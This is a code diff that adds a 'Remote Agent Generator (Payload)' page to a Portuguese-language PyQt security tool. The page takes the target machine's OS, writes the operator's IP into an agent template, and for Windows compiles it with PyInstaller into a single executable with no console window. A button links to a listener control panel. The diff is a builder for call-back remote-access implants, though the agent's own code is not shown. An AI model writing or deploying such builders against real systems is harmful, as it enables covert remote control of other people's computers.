@@ -1051,6 +1051,114 @@ class FirewallPage(QWidget):
         self.action_group.setTitle(lang_get(L, "firewall_page.execution_test", "Execução do Teste"))
         self.btn_local.setText(lang_get(L, "firewall_page.start_audit", "Iniciar Auditoria Local"))
         self.log_output.setText(lang_get(L, "firewall_page.waiting", "Aguardando comando..."))
+
+# --- PAGINA DO AGENTE ---
+class PayloadPage(QWidget):
+    def __init__(self, parent_window):
+        super().__init__()
+        self.parent_window = parent_window
+        self.L = getattr(parent_window, 'L', {})
+        self._setup_ui()
+
+    def _setup_ui(self):
+        layout = QVBoxLayout(self)
+        layout.setContentsMargins(30, 30, 30, 30)
+        layout.setSpacing(20)
+
+        self.title_label = QLabel(lang_get(self.L, "payload_page.title", "📦 Gerador de Agente Remoto (Payload)"))
+        self.title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
+        layout.addWidget(self.title_label)
+
+        self.desc_label = QLabel(lang_get(self.L, "payload_page.description", "Selecione o sistema operacional do computador alvo para gerar o agente de conexão."))
+        self.desc_label.setStyleSheet("color: #aaaaaa;")
+        layout.addWidget(self.desc_label)
+
+        self.btn_win = QPushButton(lang_get(self.L, "payload_page.generate_windows", "🪟 Gerar Agente para Windows (.exe)"))
+        self.btn_win.setFixedHeight(50)
+        self.btn_win.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.btn_win.clicked.connect(lambda: self.generate_payload("windows"))
+
+        self.btn_lin = QPushButton(lang_get(self.L, "payload_page.generate_linux", "🐧 Gerar Agente para Linux (.py)"))
+        self.btn_lin.setFixedHeight(50)
+        self.btn_lin.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.btn_lin.clicked.connect(lambda: self.generate_payload("linux"))
+
+        self.btn_go_listener = QPushButton(lang_get(self.L, "payload_page.go_listener", "Ir para Painel de Controle 📡"))
+        self.btn_go_listener.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(8))
+        layout.addWidget(self.btn_go_listener)
+
+        layout.addWidget(self.btn_win)
+        layout.addWidget(self.btn_lin)
+
+        self.status_log = QLabel(lang_get(self.L, "payload_page.awaiting", "Aguardando seleção..."))
+        self.status_log.setStyleSheet("background: #111; padding: 10px; border: 1px solid #333;")
+        layout.addWidget(self.status_log)
+
+        layout.addStretch()
+        
+        self.btn_back = QPushButton(lang_get(self.L, "payload_page.back", "⬅ Voltar"))
+        self.btn_back.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(6))
+        layout.addWidget(self.btn_back)
+
+    def generate_payload(self, os_type):
+        import socket
+        import subprocess
+        
+        try:
+            s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s_temp.connect(("8.8.8.8", 80))
+            my_ip = s_temp.getsockname()[0]
+            s_temp.close()
+        except:
+            my_ip = "127.0.0.1"
+
+        self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.generating', '[INFO] Gerando agente para {os_type} (IP: {my_ip})...').format(os_type=os_type, my_ip=my_ip)}</b>")
+        QApplication.processEvents()
+
+        try:
+            payload_dir = os.path.join(self.parent_window.base_dir, "logs", "payloads")
+            os.makedirs(payload_dir, exist_ok=True)
+            
+            agent_template_path = os.path.join(self.parent_window.base_dir, "core", "aura_agent.py")
+            
+            if not os.path.exists(agent_template_path):
+                self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.agent_not_found', '[ERROR] File core/aura_agent.py not found!')}</b>")
+                return
+
+            with open(agent_template_path, "r", encoding="utf-8") as f:
+                content = f.read()
+
+            content = content.replace('###IP_CONFIG###', my_ip)
+
+            if os_type == "linux":
+                output_file = os.path.join(payload_dir, "aura_agent_linux.py")
+                with open(output_file, "w", encoding="utf-8") as f:
+                    f.write(content)
+                self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.linux_success', '[SUCESSO] Agente Linux pronto em:')}</b> <br>{output_file}")
+                pass
+
+            elif os_type == "windows":
+                temp_py = os.path.join(payload_dir, "temp_win_agent.py")
+                with open(temp_py, "w", encoding="utf-8") as f:
+                    f.write(content)
+                
+                self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.compiling', '[INFO] Compilando EXE... Aguarde.')}</b>")
+                QApplication.processEvents()
+
+                import sys
+                cmd = f'"{sys.executable}" -m PyInstaller --onefile --noconsole --noconfirm --distpath "{payload_dir}" "{temp_py}"'
+                
+                processo = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, stderr = processo.communicate()
+                
+                if processo.returncode == 0:
+                    self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.agent_success', '[SUCESSO] Agente gerado!')}</b><br>{lang_get(self.L, 'payload_page.agent_file', 'Arquivo: temp_win_agent.exe')}")
+                else:
+                    print(f"ERRO DE COMPILAÇÃO:\n{stderr.decode()}")
+                    self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.compilation_error', '[ERRO] Falha ao compilar. Verifique o terminal.')}</b>")
+
+        except Exception as e:
+            self.status_log.setText(f"<b>{lang_get(self.L, 'payload_page.error_prefix', '[ERRO]:')}</b> {str(e)}")
     
 # --- CLASSE PRINCIPAL (MainWindow) ---
 class MainWindow(QMainWindow):
